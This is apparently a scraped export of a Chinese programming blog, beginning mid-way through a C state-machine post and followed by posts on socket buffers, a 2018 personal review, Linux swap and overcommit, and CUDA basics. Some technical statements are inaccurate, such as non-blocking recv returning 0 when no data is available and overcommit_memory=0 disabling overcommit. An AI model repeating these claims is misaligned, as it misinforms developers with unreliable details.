int event; //事件 int CurState; //当前状态 void (*eventActFun)(); //函数指针 int NextState; //下一个状态}FsmTable_t; 接下来定义出最重要FSM的状态表，我们整个FSM就是根据这个定义好的表来运转的。 1234567891011FsmTable_t XiaoMingTable[] ={ //{到来的事件，当前的状态，将要要执行的函数，下一个状态} { EVENT2, SLEEP, GetUp, GET_UP }, { EVENT1, GET_UP, Go2School, GO_TO_SCHOOL }, { EVENT2, GO_TO_SCHOOL, HaveLunch, HAVE_LUNCH }, { EVENT3, HAVE_LUNCH, DoHomework, DO_HOMEWORK }, { EVENT1, DO_HOMEWORK, Go2Bed, SLEEP }, //add your codes here}; 状态机的注册、状态转移、事件处理的动作实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/*状态机注册*/void FSM_Regist(FSM_t* pFsm, FsmTable_t* pTable){ pFsm-&gt;FsmTable = pTable;}/*状态迁移*/void FSM_StateTransfer(FSM_t* pFsm, int state){ pFsm-&gt;curState = state;}/*事件处理*/void FSM_EventHandle(FSM_t* pFsm, int event){ FsmTable_t* pActTable = pFsm-&gt;FsmTable; void (*eventActFun)() = NULL; //函数指针初始化为空 int NextState; int CurState = pFsm-&gt;curState; int flag = 0; //标识是否满足条件 int i; /*获取当前动作函数*/ for (i = 0; i&lt;g_max_num; i++) { //当且仅当当前状态下来个指定的事件，我才执行它 if (event == pActTable[i].event &amp;&amp; CurState == pActTable[i].CurState) { flag = 1; eventActFun = pActTable[i].eventActFun; NextState = pActTable[i].NextState; break; } } if (flag) //如果满足条件了 { /*动作执行*/ if (eventActFun) { eventActFun(); } //跳转到下一个状态 FSM_StateTransfer(pFsm, NextState); } else { // do nothing }} 主函数我们这样写，然后观察状态机的运转情况 1234567891011121314151617int main(){ FSM_t fsm; InitFsm(&amp;fsm); int event = EVENT1; //小明的一天,周而复始的一天又一天，进行着相同的活动 while (1) { printf(&quot;event %d is coming...\\n&quot;, event); FSM_EventHandle(&amp;fsm, event); printf(&quot;fsm current state %d\\n&quot;, fsm.curState); test(&amp;event); sleep(1); //休眠1秒，方便观察 } return 0;} 看一看该状态机跑起来的状态转移情况： 上面的图可以看出，当且仅当在指定的状态下来了指定的事件才会发生函数的执行以及状态的转移，否则不会发生状态的跳转。这种机制使得这个状态机不停地自动运转，有条不絮地完成任务。 与前两种方法相比，使用函数指针实现FSM能很好用于大规模的切换流程，只要我们实现搭好了FSM框架，以后进行扩展就很简单了（只要在状态表里加一行来写入新的状态处理就可以了）。 需要FSM完整代码的童鞋请访问我的github","link":"/2017/06/23/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BAFSM%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"title":"谈谈socket缓冲区","text":"每个socket被创建后，无论使用的是TCP协议还是UDP协议，都会创建自己的接收缓冲区和发送缓冲区。当我们调用write()/send() 向网络发送数据时，系统并不会 马上向网络传输数据，而是首先将数据拷贝到发送缓冲区，由系统负责择时发送数据。根据我们选用的网络协议以及阻塞模式，系统会有不同的处理。 这些socket缓冲区特性可整理如下： socket缓冲区在每个套接字中单独存在； socket缓冲区在创建套接字时自动生成； 即使关闭套接字也会继续传送发送缓冲区中遗留的数据； 关闭套接字将丢失接收缓冲区中的数据。 TCP阻塞和非阻塞模式下的数据发送 阻塞模式下，调用write()/send()后程序将阻塞，如果发送缓冲区的可用长度大于待发送的数据，则数据将全部被拷贝到发送缓冲区，等待系统将发送缓冲区内的数据发送出去，当数据全部被拷贝到发送缓冲区后阻塞状态将消失；如果发送缓冲区的长度小于待发送的数据长度，则数据能拷贝多少就先拷贝多少（分批拷贝），一直等待直到数据可以全部被拷贝到发送缓冲区为止才可调用返回。write()/send()调用返回后并不能保证数据已经发送到对方缓冲区了，只能保证数据成功拷贝到发送缓冲区了，至于传输可靠性方面那就是由系统的协议栈来保证。 非阻塞模式下，调用write()/send()后，如果发送缓冲区剩余大小大于待发送的数据大小，那数据将完整拷贝到发送缓冲区，如果发送缓冲区剩余大小小于待发送的数据大小，那本次write()/send()则为尽可能拷贝，有多少空间就拷贝多少数据，返回值为均为成功拷贝到发送缓冲区的数据长度。 当接收端不接收数据，或者处理速率比发送方的发送速率低导致其接收缓冲区已满（接收窗口win=0），进而导致数据发送方的发送缓冲区的数据不断堆积进而缓冲区满，此时我们再调用write()/send()都将阻塞等待。 系统将发送缓冲区的数据通过网卡发到网络了，系统也不会立即将刚发送的数据从缓冲区中移除，只有当接收方回复了ack，我们才能认为对方收到了我们发送的信息，否则刚发送的数据必须还保留在发送缓冲区等待重传。当系统收到接收方对刚发送数据的ack后，才会移除发送缓冲区内对应的数据，腾出空间。 当启用了Nagle算法后，数据会倾向于堆积到一定大小或超时后才真正往网络发送数据，因此启用Nagle算法后的发送缓冲区更容易发生数据堆积。 因为发送缓冲区满导致write()/send()一直无法返回，这个可以通过setsockopt的参数 SO_SNDTIMEO来做超时处理，如果有数据成功拷贝到发送缓冲区，那超时后的返回值是成功拷贝到发送缓冲区的数据长度，如果没有数据拷贝成功，此时的超时后返回值为-1，errno为EAGAIN 或 EWOULDBLOCK，表现就是跟非阻塞模式的write()/send()是一样的。如果不设置默认就是永不超时。 socket关闭时，但发送缓冲区中的数据仍未完全成功发送出去，那么这些数据将由系统负责把数据可靠地发送给对方。 TCP阻塞和非阻塞模式下的数据接收 调用read()/recv()时，如果模式选择的是阻塞模式，那么当接收缓冲区没数据时，程序就会一直拥塞等待，直到有数据可读为止，每次读的数据大小由进程控制，一般都需要分批读取，read()/recv()成功返回时的返回值是成功读取到的数据的长度；如果模式选择的是非阻塞模式，那么程序调用read()/recv()调用返回的返回值是成功读取的字节数，如果没数据可读时同样是马上返回，此时的返回值为0。 当程序并没有及时读取接收缓冲区中的数据，那缓冲区可利用的空间逐渐变小，直到缓冲区满，但TCP套接口接收缓冲区不可能溢出。这是因为TCP有流量控制策略，根据TCP的流量控制中滑动窗口机制，接收方会捎到窗口大小给发送方，如果缓冲区空间为0发送方也能及时知道停止发送。 当socket关闭时，如果接收缓冲区还有数据没读取，那么这部分数据将被丢弃。 跟TCP阻塞写相同，我们可以通过setsockopt的参数 SO_SNDTIMEO来对阻塞模式的读做超时处理，如果一段时间内没有数据读取成功，此时的超时后返回值为-1，errno为EAGAIN 或 EWOULDBLOCK。 recv的第四个参数若为MSG_WAITALL，则在阻塞模式下不等到指定数目的数据不会返回，除非超时时间到。当然如果对方关闭了，即使超时时间未到，recv 也返回0。 UDP阻塞和非阻塞下的数据发送接收 UDP套接口有发送缓冲区大小（SO_SNDBUF修改），不过它仅仅是写到套接口的UDP数据报的大小上限，即UDP没有发送缓冲区。如果一个应用程序写一个大于套接口发送缓冲区大小的数据报，内核将返回EMSGSIZE错误。 从UDP套接口write成功返回仅仅表示用户写入的数据报或者所有片段已经加入到数据链路层的输出队列。如果该队列没有足够的空间存放该数据包或者它的某个片段，内核通常返回给应用进程一个ENOBUFS错误。 UDP是没有流量控制的：较快的发送端可以很容易淹没较慢的接收端，当接收缓冲区满后，后面收到的数据报都将丢弃。 UDP存在丢包的可能：调用recvfrom方法接收到数据后，处理数据花费时间太长，再次调用recvfrom，两次调用间隔里，发过来的包可能丢失。处理方法是调大接收缓冲区或者通过将接收到数据存入一个缓冲区，并迅速返回继续recvfrom。 1234567UDP socket 设置为的非阻塞模式 Len = recvfrom(SocketFD, szRecvBuf, sizeof(szRecvBuf), MSG_DONTWAIT, (struct sockaddr *)&amp;SockAddr,&amp;ScokAddrLen);UDP socket 设置为的阻塞模式 Len = recvfrom(SocketFD, szRecvBuf, sizeof(szRecvBuf), 0, (struct sockaddr *)&amp;SockAddr,&amp;ScokAddrLen); 阻塞、非阻塞的本质 阻塞：阻塞的本质是，进程因为资源等待而主动让出CPU，进程从运行队列删除，幷加入到等待队列，然后等待资源。等超时或数据资源到来则唤醒进程继续执行，若有数据可读那就把数据拷贝给进程，无数据可读但超时了则返回进程继续执行后面的逻辑。 非阻塞：本质是应用进程掌控读取数据的节奏，通过轮训的方式查询数据是否可读，进程始终占用着CPU，能比较好地满足高性能进程需求，执行效率高（数据没到位，进程可以继续处理其他业务，无需阻塞其他业务进行）。","link":"/2020/12/25/%E8%B0%88%E8%B0%88socket%E7%BC%93%E5%86%B2%E5%8C%BA/"},{"title":"我的2018：OCR、实习和秋招","text":"真的是光阴似箭，好像昨天还沉浸在考研成功的喜悦，今天却要即将步入2019年，即将硕士毕业。老规矩，还是在每一年的最后一天总结今年以及展望明年。回首2018，经历的东西特别多，视野也开阔了不少，可以说，2018是丰收的一年。如果用三个关键词来描述我的2018，那无疑是：OCR、实习和秋招。 2018是研究生成长极快的一年，年初把研一上学期一直专注的研究整理成两个发明专利并成功公开，算是很早就达到了学院的毕业要求，所以在接下来的研究生生涯里可以花更多的时间放在自己感兴趣的领域深入探索，以及可以有充足的时间尝试新的想法。在研究生初期一直在专研传统计算机视觉的东西，无论是图像拼接还是图像特征点，都是偏向于传统方法。研究生中期逐渐转向了深度学习，尤其一直专注于OCR领域，并在这个领域探索了不少时间，从文本检测到文字识别，再到端到端的文本识别，再到近期研究的特定领域的文字识别。OCR构成了我2018研究生生涯的关键词，基本的精力都放在这里了，这期间也在博客园写了不少关于OCR的文章，貌似反响也不错。现在比较大的想法是，OCR近年来的进展非常迅猛，是在一些特定场景落地的好时期，刚好自己也在文字识别这个方向有所积累，所以也想把OCR技术应用到一些生活场景中，解决生活中的一些难题。12月也是我毕业论文开题的时间点，我也毫不犹豫地选择了OCR算法研究作为我的毕业论文方向，我觉得，我的研究生生涯如果以OCR算法研究来作为我的研究生标签的话那真是十分贴切了。 2018年是忙碌的一年，因为专硕时间非常紧，基本需要一年内完成研究成果的发布、实习和秋招找工作，另一年一般用于基本的上课修学分以及毕业论文和答辩。所以2018年就是一个忙碌的年份，因为这一年我除了要尽早给出研究成果外，还需要完成实习和秋招两件大事。今年实习招聘很早，我大概二月底就开始找暑假实习了，因为一开始没什么经验，面试什么的基本都翻车，后面掌握套路了，面试起来越来有信心，基础知识也越面越牢固，接下来接陆续收到一些offer，后面刚好也收获了Intel中国研究中心的实习offer，跟经理讨论了实习的内容，感觉非常有趣，后面就直接接受了。 后面5月到9月一直在北京英特尔实习，实习期间过得非常愉快，与一群厉害的研究员和工程师工作，真是受益匪浅。因为实习期间也刚好是秋招提前批开始的时间点，所以我也在7月底开始着手准备秋招提前批的知识储备。一边实习一边找工作真是压力很大，还有的时候实验室导师也找我做点研究，所以那段时真的是黑暗岁月，真的非常累。想起8月份那段时间经常实习时写写代码被打电话过来面试，然后匆匆忙忙去电梯间接电话面试，还是相当窘迫，不过没办法，大家都是这么过来的哈哈。秋招找工作相对于春招找实习真的是简单太多了，第一是因为有了春招实习面试的经验，秋招面试完全不虚，有套路可循，而且8月时自己的知识储备更加充分了，自信满满；第二是有了Intel的实习经历，在跟面试官介绍时也有了十足的话题。所以我在在8月各大公司的提前批招聘时基本都收获了不少不错offer，后面正式秋招都基本没参与了，所以所谓的金九银十我也没太多想法。 在这个秋招阶段一共收获了8个offer：在8月提前批大潮时已经收获了腾讯、快手、360、VIVO和平安的offer，9月结束Intel的实习回到学校继续学业，然后整个月基本处于划水阶段，然后只收获了AI独角兽地平线的算法岗offer（这种小而精的公司面试真难，五轮狂轰乱炸）。10月某个早上我在Intel的经理打电话给我高兴地通知我他为我申请到了return offer，真是振奋人心的消息！10月底，刚好看到宝洁IT管培生的招聘，这里想说说这段有趣的经历。本来是不考虑非互联网企业，后面因为有个朋友一直很想去宝洁当管培生，而且我了解宝洁这家公司后，也被这家公司圈粉了，福利和管培生培养制度都属于业界翘楚。后面我也觉得要不试试世界500强的管培生，锻炼锻炼技术之外的技能？我的英语口语很渣，但我竟敢紧张练习英语口语几天，就去宝洁广州总部面试了。这种世界顶级传统企业在招聘上并不会太关注你的技术有多强，更多关注的是你的领导能力和综合素质，考察的方面非常多，第一轮直属经理对你面试，对英语口语对你项目领导能力进行考察，看重你解决问题能力；第二轮是宝洁三个不同部门的总监对你轮番发问，全程高压问答一小时，专业技术知识考察和项目解决能力的考察依然是重点，当然英语问答还是少不了的，英语问答还是用我的蹩脚广东英语回答了一下，场面一度非常尴尬。但是后面还是收获了宝洁的IT管培生offer，也算是对我的一个综合能力的一个肯定吧！ 回想2018，真的经历了很多事情，忙碌却非常充实，感觉一年时间很短，但成长又很多。3月跟随自动驾驶团队到了常熟进行了15天的上线前的研发调试，通宵达旦最后把自动驾驶最新版本成功上线，新闻发布会演示非常顺利；4月找实习，经历各种失败各种心态崩溃又不断自我调节，最后选择入职英特尔；5至9月在北京开启实习生生活，在公司里遇到一群非常优秀的同事，见到规范化的项目开发流程，学习到了书本学不到的各种技术；在生活里也认识一群好玩优秀的小伙伴，让我在北京的生活丰富多彩；8到10月秋招旅程，虽然刚开始很苦，但一路都比较顺利，最后也得到了理想公司的赏识；11到12月开始帮助导师负责新的项目，又是一个新的挑战，同时毕业论文正式开题，硕士毕业答辩似乎在向我招手了。 特意找来上一年写的2017总结里面定的2018计划，看看实现了多少： 12345672018的展望：1.找个好工作，发个好paper，就是2018最大的愿望。 // 工作找好了，paper放在2019发，2018发了专利，获得了毕业条件2.博客坚持写，不断总结不断提高。 // 这个还在坚持3.在github上认真搞一个好project，拿些星星。 // 大突破，贡献了几个好项目4.把现在的项目做好，顺利上线。 // 基本完成吧5.坚持读经典课外书，坚持体育锻炼，综合素质比什么都重要。 //看书和锻炼都有在坚持6.好好搞个大比赛，上次没拿到奖，这次争取拿到！ //2018没有参加比赛了，感觉比赛对我的吸引力不是太强，太忙了 说一说2018最富有成就感的事情吧 去了Intel实习 在北京结识到一群优秀有趣的朋友 找到了理想的工作 博客一直坚持更新，虽然更新频率不高，但是还是会坚持的，现在技术博客的粉丝突破了800，阅读量也超过50W了 今年在GitHub开源了几个好玩的项目，逐渐有了一百多个follwers，星星也攒了好几百 收获两项发明专利 2018总结完了，是时候给新的一年做做计划了！ 整理手头上的研究成果，投顶会paper 顺利过论文审核，顺利过论文答辩，顺利7月毕业！！！2019的终极目标。 钻研一下分布式系统，分布式计算，推荐系统的知识 会在毕业论文写好以后开源两个有趣的项目：多图自动拼接算法和票据识别系统 走南闯北，能顺利毕业的话，真想去台湾走一走！ 上传几张2018有趣的照片 我在Github上2018一年的活动，我是一个纯粹的程序员： 我参加了阿里极客训练营，见到了大佬云风 常熟拼命上线后，去了苏州逛了逛，夜色迷人 某天实习下班，发现天都黑了，远远望去公司大楼，非常漂亮： 北京实习时的小窝，逸成东苑，难忘的地方：","link":"/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/"},{"title":"谈谈缺页、swap、惰性分配和overcommit","text":"Linux下的内存管理其实都绕不开文章题目的4个词语：缺页、swap、惰性分配和overcommit，而操作系统的内存管理的难点在于： 物理内存不够该怎么做？ 内存分配怎么才能做到高效？ 本文想谈的是，内存不足时Linux操作系统是怎么高效分配内存资源的。 Linux 内核给每个进程都提供了一个独立的虚拟地址空间，并且这个地址空间是连续的。这样，进程就可以很方便地访问内存，更确切地说是访问虚拟内存。 32位操作系统的可寻址范围是4G，因此32位系统的最大可分配的内存空间为4G。比如我们一个32位系统，内存为1G，我们可以给某个进程最大可分配3G内存空间（1G为系统自留使用）。对于64位系统，寻址空间为2的64次方，一个非常大的数，理论上我们不可能使用完这些空间。而64位系统的内核空间和用户空间都是 128T，分别占据整个内存空间的最高和最低处，剩下的中间部分是未定义的。 进程是分为内核态和用户态，进程处于用户态时，只能访问用户空间地址，当陷入内核态时，就可以方便地进行系统调用，使用内核空间地址。用户空间内存，从低到高分别是五种不同的内存段。 只读段，包括代码和常量等。 数据段，包括全局变量等。 堆，包括动态分配的内存，从低地址开始向上增长。 文件映射段，包括动态库、共享内存等，从高地址开始向下增长。 栈，包括局部变量和函数调用的上下文等。栈的大小是固定的，一般是 8 MB。 在这五个内存段中，堆和文件映射段的内存是动态分配的。比如说，使用 C 标准库的 malloc() 或者 mmap() ，就可以分别在堆和文件映射段动态分配内存。 因为每个进程都可以寻址的空间范围是虚拟内存的地址大小，如果我们所有进程的虚拟内存加起来，肯定是远比物理内存要大的。操作能做到能向进程提供比物理内存大的虚拟内存，依赖三项技术： 快速的内存地址转换（虚拟地址到物理地址） 惰性分配 overcommit 虚拟内存地址映射到物理内存地址，是一项极为高频的操作，CPU并不会直接参与这项转换的工作，而是将地址转换的工作交给了MMU。每个进程都有自己的页表，记录虚拟地址与物理地址的映射关系，大小一般为4KB。页表实际上存储在 CPU 的内存管理单元MMU中，这样，正常情况下，处理器就可以直接通过硬件，找出要访问的内存。 为了加速完成内存映射，操作系统会将TLB（Translation Lookaside Buffer，转译后备缓冲器）作为MMU 中页表的高速缓存，进而提高 CPU 的内存访问性能。当CPU给MMU传新虚拟地址之后，MMU先去问TLB那边有没有，如果有就直接拿到物理地址发到总线给内存，没有则再进行MMU的地址转换操作。 地址翻译的过程： 考虑一个问题：虚拟地址在TLB和Page Table都没有找到对应的物理页帧时会发生什么？会发生缺页异常Page Fault，它是一个由硬件中断触发的可以由软件逻辑纠正的错误。假如目标内存页在物理内存中没有对应的页帧或者存在但无对应权限，CPU 就无法获取数据，这种情况下CPU就会报告一个缺页错误。一般的缺页错误有以下三种： 当进程向系统申请分配内存时，操作系统采取的是惰性分配的策略，即系统会快速回应需要内存的进程表示你的申请是有效的，但此时并不会为该进程真正分配出内存空间，而是在该进程真正使用到这段内存时才真正分配，这就是惰性分配思想。操作系统采取惰性分配的好处个人认为如下： 避免某些进程空占着内存资源。有些进程在初始化时就先分配了大量内存，但这些内存空间也许要等到某些条件触发时才会利用上，也有可能到进程退出时也用不到这些内存，因此为了保证内存的使用率，惰性分配很有必要。以一个“延时满足”的思想解决了内存消耗过快的问题。 我们知道，物理内存不足我们可以通过swap分区来扩展可利用的内存资源，也就是虚拟内存。 虚拟内存在逻辑上是很大，但是实际上我们不会无节制地开启虚拟内存，一般而言，我们线上的服务器都是采取物理内存+swap分区的策略，比如8G的物理内存+8G swap分区的策略，比较高效的处理内存不足的问题。swap的思想是把不常用的内存数据放在磁盘中去，Swap 其实就是把一块磁盘空间当成内存来用。它可以把进程暂时不用的数据存储到磁盘中（这个过程称为换出，swapout），当进程访问这些内存时，再从磁盘读取这些数据到内存中（这个过程称为换入，swapin），那怎么判定内存的哪些数据是不常用数据需要换出呢，LRU,LFU等都是常用的算法。当物理内存紧张的情况下，当进程访自己已申请的内存地址时，操作系统发现这段内存地址并不在物理内存里，此时就会发生缺页中断，根据内存置换算法选出指定页swapout到磁盘，再将马上要使用到的页swapin到内存，完成了页面的swapin和swapout。 那当我们不得不开启swap时，swap分区的大小该怎么设计呢？一般而言，内存和swap分区的大小1：1是个不会太错的选择，比如4G的物理内存可以考虑配备4G的swap分区。如果物理内存远小于swap分区大小会有什么后果？这样的配备首先说明物理内存已经远不能处理进程的数据了，需要通过大量借助磁盘来扩展内存才能满足进程需求。这本来就是一个不合理的配比，这会导致内存数据块频繁地被置换到磁盘，产生大量的磁盘IO，导致系统很卡（系统性能都全消耗在缺页中断产生的磁盘IO），上面跑的进程很难得到有效调度。 但反过来，物理内存远大于swap分区并无副作用，比如我们线上 的服务器，物理内存256G，平时活动高峰期内存也完全足够，但为了稳妥起见，我们也还是配了16G的swap分区，作为系统内存异常时的一个最后保障。一些线上服务为了保持高性能一般都会把swap关掉，比如redis。 这是我们线上服务器的物理内存和交换分区的配比情况，128G物理内存 + 4G的交换分区，因为游戏服务器非常重视单机高性能，所以基本都是内存能开多大就开多大，swap的开启也只是为了某些极端情况下的保底处理，正常情况下都用不上。 123Mem: 14G Active, 21G Inact, 43G Wired, 1239M Buf, 47G FreeSwap: 4096M Total, 4096M Free 我们回到讨论内存分配机制。惰性分配会引入一个新问题：开空头支票带来的副作用，当进程真正要使用早期申请的这块内存时，系统发现系统的总的可利用的内存（物理内存+swap）已经用完了，没法兑现早期的承诺了，这就是操作系统的overcommit。这里继续举个例子来说明： 系统总可利用的内存资源总大小时4G，一个进程在初始化时向系统申请1G资源，系统因为惰性分配的原因，只回复了该进程已为你分配了1G资源，但实际上幷没有开始分配。一段时间后，该进程需要访问这段已申请的内存地址，系统开始马上回顾当前剩余的空间，发现可用的内存空间已不足200M，此时就是overcommit，翻译过来就是“过度承诺”，操作系统这种操作之后，需要一些措施来收拾残局。 针对overcommit的场景，首先想到的是，为什么不可以在进程向系统申请分配空间时，系统先去查一下已分配出多少内存空间了，然后再决定是否回复进程本次申请是否成功？答案是可以的，Linux对应的是系统的一个配置，直接禁用overcommit就好。但是禁用的坏处是，内存的利用率不高。考虑到进程之间很少会同时访问大量内存空间，比如4G的内存，操作系统进行overcommit了12G的的空头支票给进程，因为并不是所有进程都在同一刻要求使用4G以上的内存资源，所以overcommit在大多数场合是合适的，不开启overcommit，可利用的资源是4G，开启后可能就可以达到8G甚至更多。但最后还是得有措施保底，即真的有某一个时刻进程要使用的内存空间大于可利用的内存空间呢？ 上面的swap是为了解决物理内存不足，但当物理内存+交换分区都不足时，比如上面的配置，我们可以利用的虚拟内存总和就是16G，当已分配的内存超过这个数字时，操作系统必须采取某个策略来处理内存不足的问题了。事实上，内存再大，对应用程序来说，也有不够用的时候。 这个策略就是OOM killer，即当系统中可利用的内存资源已经耗尽时，OOM killer机制会对杀死分数最高的进程，以求释放内存资源保证系统可以稳定运行。 在Linux上swap，overcommit都是有参数可以调整的，比如调overcommit对应的参数是overcommit_memory。 overcommit_memory是一个内核对内存分配的一种策略,它有三个可选值:0、1、2。 12345https://github.com/torvalds/linux/blob/master/include/uapi/linux/mman.h #define OVERCOMMIT_GUESS 0#define OVERCOMMIT_ALWAYS 1#define OVERCOMMIT_NEVER 2 0：内核将检查是否有足够的内存分配给程序。如果没有则申请失败，并把错误返回给应用进程。而在Redis中这个错误就会表现为“Cannot allocate memory”，然后触发OOM 1：表示内核允许超量使用内存直到用完为止 2：表示内核决不超量使用内存，即系统整个内存空间不能超过swap+50%的RAM值，50%是overcommit_ratio默认值，此参数支持修改 1234lijunshi@GIH-D-21171:/mnt/e/services$ grep -i commit /proc/meminfoCommitLimit: 515524 kBCommitted_AS: 3450064 kB 其中， CommitLimit = swap（交换内存） + mem(物理内存) * overcommit_ratio / 100。这和CommitLimit的数值是吻合的。 overcommit_ratio查看方法如下： 12$ cat /proc/sys/vm/overcommit_ratio50 所以我们可以根据需求配置这个参数，刚举的例子就是对应为参数1，允许内核分配超过所有物理内存和交换空间总和的内存，当实在是无法处理时就使用OOM killer杀进程释放内存。在实际案例中，Redis建议把这个值设置为1，是为了让bgsave时fork能够在低内存下也执行成功。 这是我个人PC上的ubuntu的内存配置，16G物理内存搭配了48G的swap分区，物理内存已消耗了50%，但此状态下的swap很低，基本没有使用。 1234567891011lijunshi@GIH-D-21171:/mnt/e/services$ free -h total used free shared buff/cache availableMem: 15Gi 7.3Gi 8.4Gi 17Mi 223Mi 8.5GiSwap: 48Gi 124Mi 47Gilijunshi@GIH-D-21171:/mnt/e/services$ cat /proc/sys/vm/overcommit_memory0lijunshi@GIH-D-21171:/mnt/e/services$ cat /proc/sys/vm/swappiness60 我的ubuntu系统overcommit_memory默认为0，即表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。也就是每次内存申请时都将判定这次申请是否真的成功，放弃惰性分配策略，不会产生overcommit现象。 而swap分区对应的内存参数是swappiness。swappiness的值的大小对如何使用swap分区是有着很大的联系的。swappiness=0的时候表示最大限度使用物理内存，然后才是swap空间，swappiness＝100的时候表示积极的使用swap分区，并且把内存上的数据及时的搬运到swap空间里面。linux的基本默认设置为60。当swappines设置得比较大时，你会发现即使系统物理内存还剩余很多，但系统还是倾向于大量使用很慢的swap分区，这就导致系统很卡。但值得注意的是swappiness=0并不表示禁用交换分区，而是指尽可能不使用交换分区，但当内存已经耗尽时也会选择使用交换分区，如果不想使用交换分区，那就不要启用swap。 所以一个重要的性能优化经验就是：最好禁用swap。swap应该是针对以前内存小的一种优化,如果是高性能服务，最好禁止 Swap，比如redis，mysql等服务，都是推荐禁用swap的。如果必须开启 Swap，那需要降低 swappiness 的值，减少内存回收时 Swap 的使用倾向。","link":"/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/"},{"title":"CUDA编程之快速入门","text":"CUDA（Compute Unified Device Architecture）的中文全称为计算统一设备架构。做图像视觉领域的同学多多少少都会接触到CUDA，毕竟要做性能速度优化，CUDA是个很重要的工具，CUDA是做视觉的同学难以绕过的一个坑，必须踩一踩才踏实。CUDA编程真的是入门容易精通难，具有计算机体系结构和C语言编程知识储备的同学上手CUDA编程应该难度不会很大。本文章将通过以下五个方面帮助大家比较全面地了解CUDA编程最重要的知识点，做到快速入门： GPU架构特点 CUDA线程模型 CUDA内存模型 CUDA编程模型 CUDA应用小例子 1. GPU架构特点首先我们先谈一谈串行计算和并行计算。我们知道，高性能计算的关键利用多核处理器进行并行计算。 当我们求解一个计算机程序任务时，我们很自然的想法就是将该任务分解成一系列小任务，把这些小任务一一完成。在串行计算时，我们的想法就是让我们的处理器每次处理一个计算任务，处理完一个计算任务后再计算下一个任务，直到所有小任务都完成了，那么这个大的程序任务也就完成了。如下图所示，就是我们怎么用串行编程思想求解问题的步骤。 但是串行计算的缺点非常明显，如果我们拥有多核处理器，我们可以利用多核处理器同时处理多个任务时，而且这些小任务并没有关联关系（不需要相互依赖，比如我的计算任务不需要用到你的计算结果），那我们为什么还要使用串行编程呢？为了进一步加快大任务的计算速度，我们可以把一些独立的模块分配到不同的处理器上进行同时计算（这就是并行），最后再将这些结果进行整合，完成一次任务计算。下图就是将一个大的计算任务分解为小任务，然后将独立的小任务分配到不同处理器进行并行计算，最后再通过串行程序把结果汇总完成这次的总的计算任务。 所以，一个程序可不可以进行并行计算，关键就在于我们要分析出该程序可以拆分出哪几个执行模块，这些执行模块哪些是独立的，哪些又是强依赖强耦合的，独立的模块我们可以试着设计并行计算，充分利用多核处理器的优势进一步加速我们的计算任务，强耦合模块我们就使用串行编程，利用串行+并行的编程思路完成一次高性能计算。 接下来我们谈谈CPU和GPU有什么区别，他们俩各自有什么特点，我们在谈并行、串行计算时多次谈到“多核”的概念，现在我们先从“核”的角度开始这个话题。首先CPU是专为顺序串行处理而优化的几个核心组成。而GPU则由数以千计的更小、更高效的核心组成，这些核心专门为同时处理多任务而设计，可高效地处理并行任务。也就是，CPU虽然每个核心自身能力极强，处理任务上非常强悍，无奈他核心少，在并行计算上表现不佳；反观GPU，虽然他的每个核心的计算能力不算强，但他胜在核心非常多，可以同时处理多个计算任务，在并行计算的支持上做得很好。 GPU和CPU的不同硬件特点决定了他们的应用场景，CPU是计算机的运算和控制的核心，GPU主要用作图形图像处理。图像在计算机呈现的形式就是矩阵，我们对图像的处理其实就是操作各种矩阵进行计算，而很多矩阵的运算其实可以做并行化，这使得图像处理可以做得很快，因此GPU在图形图像领域也有了大展拳脚的机会。下图表示的就是一个多GPU计算机硬件系统，可以看出，一个GPU内存就有很多个SP和各类内存，这些硬件都是GPU进行高效并行计算的基础。 现在再从数据处理的角度来对比CPU和GPU的特点。CPU需要很强的通用性来处理各种不同的数据类型，比如整型、浮点数等，同时它又必须擅长处理逻辑判断所导致的大量分支跳转和中断处理，所以CPU其实就是一个能力很强的伙计，他能把很多事处理得妥妥当当，当然啦我们需要给他很多资源供他使用（各种硬件），这也导致了CPU不可能有太多核心（核心总数不超过16）。而GPU面对的则是类型高度统一的、相互无依赖的大规模数据和不需要被打断的纯净的计算环境，GPU有非常多核心（费米架构就有512核），虽然其核心的能力远没有CPU的核心强，但是胜在多，在处理简单计算任务时呈现出“人多力量大”的优势，这就是并行计算的魅力。 整理一下两者特点就是： CPU：擅长流程控制和逻辑处理，不规则数据结构，不可预测存储结构，单线程程序，分支密集型算法 GPU：擅长数据并行计算，规则数据结构，可预测存储模式 现在的计算机体系架构中，要完成CUDA并行计算，单靠GPU一人之力是不能完成计算任务的，必须借助CPU来协同配合完成一次高性能的并行计算任务。 一般而言，并行部分在GPU上运行，串行部分在CPU运行，这就是异构计算。具体一点，异构计算的意思就是不同体系结构的处理器相互协作完成计算任务。CPU负责总体的程序流程，而GPU负责具体的计算任务，当GPU各个线程完成计算任务后，我们就将GPU那边计算得到的结果拷贝到CPU端，完成一次计算任务。 所以应用程序利用GPU实现加速的总体分工就是：密集计算代码（约占5%的代码量）由GPU负责完成，剩余串行代码由CPU负责执行。 2. CUDA线程模型下面我们介绍CUDA的线程组织结构。首先我们都知道，线程是程序执行的最基本单元，CUDA的并行计算就是通过成千上万个线程的并行执行来实现的。下面的机构图说明了GPU的不同层次的结构。 CUDA的线程模型从小往大来总结就是： Thread：线程，并行的基本单位 Thread Block：线程块，互相合作的线程组，线程块有如下几个特点： 允许彼此同步 可以通过共享内存快速交换数据 以1维、2维或3维组织 Grid：一组线程块 以1维、2维组织 共享全局内存 Kernel：在GPU上执行的核心程序，这个kernel函数是运行在某个Grid上的。 One kernel &lt;-&gt; One Grid 每一个block和每个thread都有自己的ID，我们通过相应的索引找到相应的线程和线程块。 threadIdx，blockIdx Block ID: 1D or 2D Thread ID: 1D, 2D or 3D 